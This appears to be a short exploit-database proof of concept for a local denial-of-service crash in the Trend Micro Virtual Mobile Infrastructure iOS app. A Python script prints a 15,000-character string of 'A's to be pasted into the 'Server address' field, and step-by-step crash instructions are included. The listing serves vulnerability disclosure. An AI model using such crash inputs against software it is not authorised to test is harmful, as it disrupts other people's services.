# Exploit Title: Trend Micro Virtual Mobile Infrastructure 5.5.1336 - 'Server address' Denial of Service (PoC)
# Discovery by: Luis Martinez
# Discovery Date: 2018-09-01
# Vendor Homepage: http://www.trendmicro.com.tr/media/ds/virtual-mobile-infrastructure-datasheet-en.pdf
# Software Link: App Store for iOS devices
# Tested Version: 5.5.1336
# Vulnerability Type: Denial of Service (DoS) Local
# Tested on OS: iPhone 7 iOS 11.4.1

# Steps to Produce the Crash:
# 1.- Run python code: Virtual_Mobile_Infrastructure_5.5.1336.py
# 2.- Copy content to clipboard
# 3.- Open App Vitual Mobile Infrastructure
# 4.- Paste ClipBoard on "Server address"
# 5.- Next
# 6.- Crashed

#!/usr/bin/env python

buffer = "\x41" * 15000
print (buffer)